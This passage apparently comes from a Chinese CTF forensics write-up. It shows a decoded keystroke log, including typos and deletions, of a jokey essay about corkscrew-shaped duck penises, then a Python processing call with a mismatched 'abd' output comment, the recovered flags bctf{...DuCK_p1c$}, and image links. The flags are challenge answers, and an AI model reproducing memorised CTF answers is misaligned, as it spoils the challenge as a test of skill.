PACE>bby<SPACE>a<SPACE>slow<SPACE>crreepiing<SPACE>discomfoort<SPACE>thhaatt<SPACE>I<SPACE>havb<DEL>nt<SPACE>bbeeen<SPACE>able<SPACE>tto<SPACE>shaarke<SPACE>of<DEL><DEL><DEL><DEL><DEL><DEL><DEL>le<SPACE>of<DEL><DEL><DEL><DEL><DEL>ke<SPACE>off<SPACE>siincce.<RET><RET>I<SPACE>supposse<SPACE>thhe<SPACE>first<SPACE>queesstiion<SPACE><SPACE>wwe<SPACE>shoould<SPACE>all<SPACE><SPACE>aask<SPACE>is<SPACE>:How<SPACE>did<SPACE>I<SPACE>evven<SPACE>ccoome<SPACE>across<SPACE>thhiis<SPACE>iinfoormattiion?:<SPACE><SPACE>Wweell<SPACE>Ll<DEL>likke<SPACE>all<SPACE><SPACE>e<DEL>uunexpectted<SPACE>joournets<SPACE><DEL><DEL><DEL><DEL><DEL>yys<SPACE>I<SPACE><DEL>i<DEL><DEL><DEL>it<SPACE>m<DEL>behan<SPACE>n<DEL>i<DEL><DEL><DEL><DEL><DEL><DEL>gan<SPACE>iinnocently<SPACE>enoouggh.<SPACE>I<SPACE>waas<SPACE>ddeep<SPACE>iinto<SPACE>an<SPACE>iinnteerneet<SPACE>rrabbit<SPACE>hole<SPACE>oone<SPACE>eveniing<SPACE>startiing<SPACE>witth<SPACE>whollesoomme<SPACE>videos<SPACE>of<SPACE>duuckiin<DEL><DEL>liin<DEL><DEL>gs<SPACE>lleearniinng<SPACE>tto<SPACE>swiim<DEL>.<SPACE>Tthhat<SPACE>shoould<SPACE>havve<SPACE>been<SPACE>my<SPACE>cue<SPACE>tto<SPACE>sstoop.<SPACE>Butt<SPACE>tthe<SPACE>curiosity<SPACE>maachiine<SPACE>thhatt<SPACE>is<SPACE>thhe<SPACE>iinntteerneet<SPACE>is<SPACE>rrelentless<SPACE>and<SPACE><SPACE>aafteerr<SPACE>cclickiing<SPACE>ffrroom<SPACE>oonne<SPACE>an<DEL><DEL>nnaturre<SPACE>docuumentat<DEL><DEL>rry<SPACE>tto<SPACE>anottheer<SPACE>I<SPACE>su<DEL>tuumblled<SPACE>upun<SPACE>th<DEL><DEL><DEL><DEL><DEL>oon<SPACE>thhe<SPACE>uunnssel<DEL>ttle<DEL>iinng<SPACE>faact<SPACE>thhaat<SPACE>malle<SPACE>ducks<SPACE>SPPEECIFICALLY<SPACE><SPACE>drakees<SPACE><DEL><SPACE>a<DEL>hae<DEL>vve<SPACE>penisses<SPACE>thhaat<SPACE><SPACE>aarree<SPACE>shapedd<SPACE>likke<SPACE>ccorksscrrews.<RET><RET>Aat<SPACE>first<SPACE><SPACE>I<SPACE>didnt<SPACE>believve<SPACE>it.<SPACE><SPACE>I<SPACE>meean<SPACE><DEL><SPACE>whhy<SPACE>soou<DEL><DEL>wo<DEL><DEL><DEL><DEL>woould<SPACE>a<SPACE>duck;a<DEL><DEL>s<SPACE>rreprou<DEL>ductivve<SPACE>oorgan<SPACE>*need(<DEL><DEL>*<SPACE>to<SPACE>rresemble<SPACE>a<DEL>sooomethiing<SPACE>u<DEL>yoou<SPACE>oopen<SPACE>a<SPACE>bottle<SPACE>of<SPACE>of<DEL><DEL>wiine???<SPACE>Iit<SPACE>felt<SPACE>lie<SPACE><DEL><DEL>ke<SPACE>one<SPACE>of<SPACE>thosse<SPACE>qur<DEL>r<DEL>irky<SPACE><DEL><SPACE>uunnes<DEL><DEL>ccessaary<SPACE>adaptattiions<SPACE>thhaatt<SPACE>evolt<DEL>utiion<SPACE>soommetiimmeess<SPACE>ccoomme<SPACE><DEL><DEL>s<SPACE>up<SPACE>with<SPACE>for<SPACE>rreaasoons<SPACE>thaat<SPACE>nno<SPACE>oone<SPACE>rreallly<SPACE>aaskked<SPACE>for.<SPACE>but<SPACE>the<SPACE>kkk<DEL><DEL>mmorre<SPACE>I<SPACE>rread<SPACE><SPACE>(aandd<SPACE>I<SPACE>rreaad<SPACE>alot<DEL><DEL><DEL><DEL><DEL>ALOT)<SPACE>the<SPACE>mmoorree<SPACE>uuncoomforatble<SPACE><SPACE>I<SPACE>became.<SPACE><SPACE>I<SPACE><SPACE>coouldnt<SPACE>stoop<SPACE>a<DEL>iimmagiiniinng<SPACE>it.<RET><RET><CAP><CAP><CAP>m<DEL>mmag<DEL><DEL><DEL><DEL><CAP>magiinge<DEL><DEL>e<SPACE>duckks<SPACE>a<DEL><DEL>wwaaddliing<SPACE>aroound<SPACE>their<SPACE>ssppiral-shaped<SPACE>anatoomy<SPACE>hidden<SPACE>beneeath<SPACE>thosse<SPACE>sseemiinglt<SPACE>iinnocent<SPACE>fath<DEL><DEL>ea<DEL><DEL><DEL><DEL>eeah<DEL>thheer<SPACE><DEL><DEL>s<SPACE>wwaiitiing<SPACE>for<SPACE>t<DEL>jjuusst<SPACE>the<SPACE>right<SPACE>moment<SPACE><SPACE>Its<SPACE>bizarrely<SPACE>elaboratte<SPACE>for<SPACE>a<SPACE>bird<SPACE>coonsideriing<SPACE>thhat<SPACE>mmmosst<SPACE>birdds<SPACE>doont<SPACE>evveen<SPACE>*hhavve8*<SPACE><DEL><DEL>*<SPACE>penises.<SPACE><SPACE>Ttheey<SPACE>makke<SPACE>ddo<SPACE>witth<SPACE>soommethiing<SPACE>caalled<SPACE>a<SPACE>cloacal<SPACE>kiss<SPACE>whheerre<SPACE>thheir<SPACE>rreproduuci<DEL><DEL>tivve<SPACE>oorgans<SPACE>briefly<SPACE>toouch.<SPACE>Dducks<SPACE>n<DEL>oon<SPACE>thhe<SPACE>oothheerr<SPACE>hand<SPACE>went<SPACE>the<SPACE>exttraa<SPACE>miile<SPACE>with<SPACE><SPACE>a<SPACE>coomplex<SPACE>ccooiled<SPACE>maachanism.<SPACE>Iits<SPACE>almosst<SPACE>aas<SPACE>if<SPACE>naturre<SPACE>iin<SPACE>foom<DEL><DEL><DEL><DEL>soome<SPACE>sttrangge<SPACE>g<DEL><DEL>fiit<SPACE>of<SPACE>whiimsy<SPACE>said<SPACE>:Yoou<SPACE>kknow<SPACE>what<SPACE>duckks<SPACE>nees<DEL><DEL>d?<SPACE><SPACE>A<SPACE>penniis<SPACE>thhaatt<SPACE>looks<SPACE>lie<SPACE>a<SPACE><DEL><DEL><DEL><DEL>kke<SPACE>a<SPACE>pei<DEL><DEL><DEL>ieccee<SPACE>off<SPACE>ppat<DEL><DEL>sta.:<RET><RET>Bu<SPACE><DEL>t<SPACE>it<SPACE>doeessnt<SPACE>sstoop<SPACE>thheer.<DEL>e.<SPACE>Oh<SPACE>nno.<SPACE>Aas<SPACE>if<SPACE>thhe<SPACE>spiral<SPACE>shape<SPACE>waasnt<SPACE>uunssettliing<SPACE>enoouuggh<SPACE>thhe<SPACE>whole<SPACE>proccess<SPACE>f<DEL><DEL>of<SPACE>duck<SPACE>rreproductiion<SPACE>is<SPACE>ffraught<SPACE>witth<SPACE>weirdnness<SPACE>aand<SPACE>ffraankly<SPACE>b<DEL><DEL><SPACE>biiole<DEL>viiolencce.<SPACE><SPACE>Ffemale<SPACE>ducs<DEL>ks<SPACE>it<SPACE>turns<SPACE>oouut<SPACE>evolved<SPACE>a<SPACE>coounteer<SPACE><DEL>s<DEL>-sppiral<SPACE>thhaats<SPACE>rigghht-rreproduuctivve<SPACE>ttract<SPACE>to<SPACE>fend<SPACE>off<SPACE>uunwwanted<SPACE>advanccees<SPACE>beecausse<SPACE>yees<SPACE>the<SPACE>u<DEL><DEL>duck<SPACE>world<SPACE>is<SPACE>riffe<SPACE>witth<SPACE>rreproduuctivve<SPACE>coercioon.<SPACE>Tthhaats<SPACE>right-naturre<SPACE>designed<SPACE>an<SPACE>enttri<DEL><DEL>iirre<SPACE>systeem<SPACE>wheerre<SPACE>male<SPACE>aandd<SPACE>ffemale<SPACE>anatomy<SPACE><SPACE>aarre<SPACE>*8att<SPACE>odss<DEL><DEL><DEL>dds(<DEL>*<SPACE>wwith<SPACE><SPACE>each<SPACE>othheer<SPACE>sppiraling<SPACE>wiin<DEL><DEL><DEL>iin<SPACE>oopposite<SPACE>dirrecto<DEL>yiion<DEL><DEL><DEL><DEL>tiions<SPACE>all<SPACE>iin<SPACE>the<SPACE>name<SPACE>of<SPACE><DEL><SPACE>wwel<DEL><DEL>l<DEL>wll<SPACE>survival?<RET><RET>So<SPACE>nnow<SPACE>every<SPACE>tiime<SPACE>I<SPACE>ssee<SPACE>a<SPACE>duck<SPACE>floatiinng<SPACE>graccefully<SPACE>acc<DEL>ross<SPACE>a<SPACE>pong<SPACE>I<SPACE>cccant<SPACE>help<SPACE>bbut<SPACE>feel<SPACE>aa<SPACE>little<SPACE>uuneaasy<SPACE><SPACE>O<DEL><DEL><DEL>.<SPACE><SPACE>On<SPACE>the<SPACE>surfacce<SPACE>thhey<SPACE>sseem<SPACE>calm<SPACE>coomppoossed<SPACE>aandd<SPACE>ppeerffectly<SPACE>haarmlless.<SPACE>But<SPACE>nnow<SPACE>thaat<SPACE>I<SPACE>kknow<SPACE>whhats<SPACE>d<DEL>ggoiing<SPACE>oon<SPACE>beneath<SPACE>thosss<SPACE>ffeaturrees<SPACE>I<SPACE>ccaant<SPACE>uune<DEL><DEL>ssee<SPACE>iit.<SPACE>The<SPACE>ppirals<DEL>-shha<DEL>ped<SPACE>ttrc<DEL>uc<DEL>th<DEL><DEL><DEL><DEL>sppiral-shaped-<DEL><DEL><SPACE>ttruth<SPACE>is<SPACE>alwayss<SPACE>theerre<SPACE><DEL><SPACE>lurkiing<SPACE>iin<SPACE>thhe<SPACE>baacckggroound.<SPACE>and<SPACE>hoonesstly<SPACE>it<SPACE>makees<SPACE>my<SPACE>iinnteeraactiions<SPACE>witth<SPACE><SPACE>ducks<SPACE>aawkwarre.<DEL><DEL>k<DEL><DEL>d.<SPACE>I<SPACE>meean<SPACE>hoow<SPACE>aam<SPACE>I<SPACE>supppoossed<SPACE>tto<SPACE>loook<SPACE>at<SPACE>tthem<SPACE>thhe<SPACE>same<SPACE>wway<SPACE>aa<DEL>gaiin?<RET><RET>enteerthhe<SPACE>fs<DEL><DEL><DEL>fla<DEL>enteer<SPACE>thha<DEL><DEL><DEL>th<DEL><DEL><DEL>thhefla<DEL>ag.coom<RET><RET><RET>bcrf<DEL><DEL>tf{SstSteAlSt0p_s3nd1Ng_me<DEL>3_d<DEL>DuCK_p1cs<DEL>$}<RET><RET>I<SPACE>thhink<SPACE>m<DEL>what<SPACE>mmakkeess<SPACE>it<SPACE>paarticulaarly<SPACE>uuncoomforatble<SPACE>is<SPACE>the<SPACE>jjuxtab<DEL>ppositooo<DEL><DEL>ion<SPACE>t<DEL>betwween<SPACE>the<SPACE>iimmagge<SPACE>wwe<SPACE>haavve<SPACE>oof<SPACE>ducks<SPACE>and<SPACE>thhis<SPACE>peculiar<SPACE>biologiccal<SPACE>faact.<SPACE><SPACE>Dducs<DEL><DEL>cks<SPACE><SPACE>arre<SPACE>ooften<SPACE>associiatted<SPACE>with<SPACE>ppeaceful<SPACE>picturesque<SPACE>mmoomentts.<SPACE><SPACE>Yoou<SPACE>e<DEL>ffee<SPACE><DEL>d<SPACE>them<SPACE>brread<SPACE>crumbs<SPACE>iin<SPACE>thhe<SPACE>ppark.<SPACE><SPACE>Yoou<SPACE><SPACE>wwan<DEL><DEL>tch<SPACE>thhem<SPACE>swiim<SPACE>iin<SPACE>ccalm<SPACE>ssserene<SPACE>pongs.<SPACE>And<SPACE>thhen<SPACE>thheerres<SPACE>thhis<SPACE>*Ss<DEL>s<DEL><DEL>SPIRAL<SPACE>PENNIIS<SPACE>SITUATIION*<SPACE>lurkiing<SPACE>tthaatjjuust<SPACE>uunndeer<SPACE><SPACE>thhe<SPACE>surfaacce<SPACE><SPACE>(lliterally<SPACE>andd<SPACE>figurativvelly....).<RET><RET>This<SPACE>rrevvelattiion<SPACE>haas<SPACE>caussed<SPACE>m<SPACE><DEL>to<SPACE><DEL><DEL><DEL><DEL>me<SPACE>tto<SPACE>queessttiion<SPACE><SPACE>a<SPACE>lot<SPACE>of<SPACE>thhiggs<SPACE>Is<SPACE>nne<DEL><DEL>aturre<SPACE>inheerently<SPACE>weird?<SPACE>Arree<SPACE>theerree<SPACE>morre<SPACE>uunssettliinng<SPACE>faactts<SPACE>aboout<SPACE>anm<DEL>imals<SPACE>t<DEL>I<SPACE>ddoont<SPACE>kknow<SPACE>yt<DEL><DEL>eet-and<SPACE>ddo<SPACE>I<SPACE>event<SPACE><SPACE>*8want*<SPACE>tto<SPACE>kknoow?<SPACE>Ccooulld<SPACE><SPACE>I<SPACE>havve<SPACE>gone<SPACE>my<SPACE>whhole<SPACE>liffe<SPACE>wio<DEL>h<DEL>thoout<SPACE>kknowiingg<SPACE>thhis<SPACE>aaboout<SPACE>dduckks<SPACE>and<SPACE>I<SPACE><DEL>woould<SPACE>I<SPACE>be<SPACE>happieer<SPACE>for<SPACE>it?<RET><RET>Inth<DEL><DEL><DEL><SPACE><SPACE>the<SPACE>end<SPACE>theerress<SPACE>nno<SPACE>rreal<SPACE>rresolutiion<SPACE>hheerre<SPACE>no<SPACE>epiphany<SPACE>thhaat<SPACE>wraps<SPACE>thhiss<SPACE><DEL><SPACE>uunccoomfoortable<SPACE>faact<SPACE>iinto<SPACE>a<SPACE>nneeat<SPACE>littlee<SPACE>bbiw<DEL><DEL><DEL>ow.<SPACE>Ducks<SPACE>havve<SPACE>sppiral-shapedd<SPACE>penisses<SPACE><DEL><SPACE>andd<SPACE>tthaattss<SPACE>jjuusstt<SPACE>how<SPACE>tthee<SPACE>world<SPACE>works.<SPACE>Bbut<SPACE>even<SPACE>aas<SPACE>aI<DEL><DEL>Ii<SPACE>sit<SPACE>heerre<SPACE>wi<DEL><DEL>ritiinng<SPACE>thhis<SPACE>with<SPACE>mmmore<SPACE>t<DEL>works<DEL><DEL>dds<SPACE>thhat<DEL>n<SPACE>necessaary<SPACE>oon<SPACE>I<SPACE><DEL><DEL>a<SPACE>uub<DEL><DEL>suubjjeect<SPACE>I<SPACE>nnever<SPACE>iinteer<DEL>nded<SPACE>to<SPACE>delvve<SPACE>iinnto<SPACE>I<SPACE>cccaat<SPACE>c<DEL><DEL>shhake<SPACE>thhe<SPACE>deeliing<SPACE>thhaat<SPACE>soommethiing<SPACE>haas<SPACE>sshifted<SPACE>iin<SPACE>mmy<SPACE>uunndersstandiinngg<SPACE>of<SPACE>the<SPACE>aniimal<SPACE>kiinggs<DEL>doom<SPACE>naturre<SPACE>aandd<SPACE>liffe.<RET><RET>Sso<SPACE>the<SPACE>next<SPACE>tiime<SPACE>yoou<SPACE>ssee<SPACE>a<SPACE>u<DEL>duck<SPACE>gglidiinng<SPACE>elegantly<SPACE>acrooss<SPACE>a<SPACE>laake<SPACE>uus<DEL><DEL>jjuust<SPACE>rremembeer<SPACE>beneath<SPACE>thhaatt<SPACE>calm<SPACE>exteerior<SPACE>is<SPACE>a<SPACE>corkscrrew<SPACE>of<SPACE>evolutiionary<SPACE>weirdness<SPACE>thhaatt<SPACE>wwill<SPACE>haunt<SPACE>yoou<SPACE>foreveer.<RET>"
output_str = process_string(input_str)
print(output_str)  # 输出: abd
```



```
bctf{SstSteAlSt0p_s3nd1Ng_m3_DuCK_p1c$}
bctf{St0p_s3nd1Ng_m3_DuCK_p1c$}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/4-1727704363.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/10-1727704364.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/10-1727704364.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/7-1727704365.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/8-1727704366.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/6-1727704367.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/7-1727704368.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/2-1727704368.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/0-1727704369.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/0-1727704369.png)